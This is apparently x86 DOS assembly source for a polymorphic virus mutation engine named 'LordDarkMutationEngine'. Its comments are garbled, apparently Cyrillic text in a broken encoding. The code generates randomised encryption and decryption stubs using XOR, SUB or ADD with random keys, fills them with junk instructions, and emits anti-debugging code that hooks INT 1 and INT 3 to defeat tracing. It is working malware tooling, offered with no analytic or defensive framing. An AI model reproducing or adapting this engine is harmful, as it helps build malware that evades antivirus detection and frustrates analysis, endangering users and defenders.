   engine:
        ; [LME] LordDarkMutationEngine
        ; à §¬¥à ~697 ¡ ©â
        ; ax - IP
        ; si - ª®¤
        ; di - ¡ãä¥à
        ; cx - ¤«¨ 
       _ax = 0
       _cx = 1
       _dx = 2
       _bx = 3
       _sp = 4
       _bp = 5
       _si = 6
       _di = 7
       mov $di, di
       mov $cx, cx
       mov $si, si
       mov $ax, ax
       mov al, 0
   use_it  equ byte ptr $-1
       cmp al, 90h
       jz  $_3
          mov ax, 6
          call random
          xchg ax, cx
          jcxz $_1
   $_2:
          call gen_byte
          loop $_2
   $_1:   mov al, 60h
          stosb
   $_3:
       mov 1 ptr reg1, -1
       mov ax, 2 ; 0..1
       call random
       mov trace_flag, al
       ;----------[ Start]---
       mov  ax, 2
       call random
       test al, al
       jz   __heh
       call not_trace
       call not_trace
       jmp  __he
   __heh:
       call gen_garbage
   __he:
       mov ax, 4
       call random
       ; 3 5 6 7
       cmp al, 0
       jnz __1
       mov al, 3
       jmp __2
   __1:
       add al, 5-1
   __2:
       mov reg1, al
       ; mov reg, offset body
       call load
       push di
       call gen_garbage
       mov al, 2Eh
       stosb
       mov ax, 3
       call random
       shl al, 1
       mov bx, ax
       mov ax, 2 ptr [bx+decrypt_inst]
       mov _crypt, ax
       add bx, offset crypt_inst
       mov al, [bx]
       stosb
       mov al, 0
   reg1 equ byte ptr $-1
       cmp al, _bx
       jnz __3
       mov al, 11b
       jmp __4
   __3:
       cmp al, _si
       jnz __5
       mov al, 0
       jmp __4
   __5:
       cmp al, _di
       jnz __6
       mov al, 1
       jmp __4
   __6:
       mov al, 2
   __4:
       or  al, [bx+1]
       stosb
   ; ->
       mov  ofs_body, di ; ofs
       stosw
       mov  ax, -1
       call random
       stosw
       mov  key, ax ; key
       call gen_garbage
       ;-------[ Inc ]---
       mov al, 40h
       or  al, reg1
       stosb
       push ax
       call gen_garbage
       pop  ax
       stosb
       call gen_garbage
       ;--------[ Cmp ]---
       mov al, 10000001b
       stosb
       mov al, 11111000b
       or  al, reg1
       stosb
   ; ->
       mov max_ofs, di
       stosw
       ;--------[ Jne ]---
       mov al, 72h
       stosb
       pop ax
       push ax
       sub ax, di
       dec ax
       stosb
       call gen_garbage
       ;----------------
       mov bx, di
       sub bx, offset buffer
   $di equ 2 ptr $-2
       pop si
       mov ax, -1
       call random
       xchg ax, dx
       ; ¤«¨ 
       ; si       - á¬¥é¥¨¥ ¨§ mov reg, xxx
       ; ofs_body - ¨§ oper 2 ptr [XXXX], XXXX
       ; key      - ª«îç
       ; max_ofs  - ¨§ cmp
       mov ax, bx
       add ax, 100h
   $ax equ 2 ptr $-2
       add ax, dx
       mov 2 ptr es:[si-2], ax
       neg dx
       mov bx, 0
   ofs_body equ 2 ptr $-2
       mov 2 ptr es:[bx], dx
       mov cx, 1234h
   $cx equ 2 ptr $-2
       shl cx, 1
       add ax, cx
       mov bx, 0
   max_ofs equ 2 ptr $-2
       mov 2 ptr es:[bx], ax
       mov si, 0
   $si equ 2 ptr $-2
       mov cx, $cx
       mov bx, 0
   key equ 2 ptr $-2
   __x:
       lodsw
   _crypt dw 0
       stosw
       loop __x
       mov cx, di
       sub cx, $di
       ret

   load:
       or al, 0B8h
       stosb
       xchg ax, dx
       stosw
       ret
   ; mov ax, 3501
   ; int 21
   ; mov es:[bx], 0CF
   ; mov ax, 3503
   ; int 21
   ; mov es:[bx], 0CF   ; 26C607CF
   not_trace:
        mov al, 0
   trace_flag equ byte ptr $-1
        test al, al
        jz  normal_trace
        dec trace_flag
        mov dx, 3503h
        jmp _not_trace
   normal_trace:
        inc trace_flag
        mov dx, 3501h
   _not_trace:
        call gen_garbage
        mov al, 0
        call load
        mov reg1, _ax
        call gen_garbage
        mov ax, 21CDh
        stosw
        mov reg1, _bx
        call gen_garbage
        mov ax, 0C626h
        stosw
        mov ax, 0CF07h
        stosw
        mov reg1, -1
        call gen_garbage
        ret
   crypt_inst:
        db 10000001b,10110100b
        db 10000001b,10000100b
        db 10000001b,10101100b
   decrypt_inst:
        xor ax, bx
        sub ax, bx
        add ax, bx

   gen_garbage:
        push dx
        mov ax, 10
        call random
        inc ax
        xchg ax, cx
   __1:
        push cx
        call garage
        pop  cx
        loop __1
        pop dx
        ret
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   big_garbage:
   ; ADD/SUB/XOR/ROL/TEST/CMP...
   IZM_1 = 1
   IZM_0 = 0
   IZM_2 = 2
       db 10001011b, IZM_1 ; mov
       db 00000011b, IZM_1 ; add
       db 00010011b, IZM_1 ; adc
       db 00100011b, IZM_1 ; and
       db 00001011b, IZM_1 ; or
       db 00101011b, IZM_1 ; sub
       db 00011011b, IZM_1 ; sbb
       db 00110011b, IZM_1 ; xor
       db 00111011b, IZM_0 ; cmp
       db 10000101b, IZM_0 ; test
       db 11010001b, IZM_2 ; rxx ®â 0..7 ªà®¬¥ 6
   len_big_garbage = ($-big_garbage)/2

   free_reg:
        mov ax, 8
        call random
        cmp al, reg1
        jz  free_reg
        cmp al, 4
        jz  free_reg
        ret

   gen_mov:
        mov ax, 0fffeh
        call random
        xchg ax, dx
        call free_reg
        jmp  load

   gen_byte:
          push bx
          mov ax, ob_len
          call random
          lea bx, one_byte
          xlat
          stosb
          pop bx
          ret

   garage:
        mov ax, len_big_garbage+2
        call random
        cmp al, len_big_garbage
        jz  gen_byte
        cmp al, len_big_garbage+1
        jz  gen_mov
        shl al, 1
        add ax, offset big_garbage
        mov bx, ax
        mov al, [bx]
        stosb
        mov al, [bx+1]
        cmp al, 2
        jnz _standart
   __k:
        mov ax, 8
        call random
        cmp al, 6
        jz  __k
        shl al, 3
        or  al, 0C0h
        mov bl, al
        call free_reg
        or  al, bl
        stosb
        ret
   _standart:
        cmp al, 0
        jnz not_change
        mov ax, 8
        call random
        jmp mumu
   not_change:
        call free_reg
   mumu:
        ; al -reg
        mov bl, al
        mov ax, -1
        call random
        and  ax, 1
        jz   _ok
        mov al, 8
        call random
        shl bl, 3
        or  al, bl
        or  al, 0C0h
        stosb
        ret
   _ok:
        ; ¢ë¡¨à ¥â MOD
        mov al, 3
        call random
        shl al, 6
        shl bl, 3
        or  bl, al
        mov al, 8
        call random
        or  al, bl
        stosb
        mov al, bl
        and al, 11000000b
        cmp al, 01000000b
        jnz __k
        mov ax, 0FEh
        call random
        stosb
        ret
   __k:
        cmp al, 10000000b
        jnz __kk
   __kkk:
        mov ax, 0FFFEh
        call random
        stosw
        ret
   __kk:
        and bl, 11111000b
        or  bl, 00000110b
        mov byte ptr es:[di-1], bl
        jmp __kkk
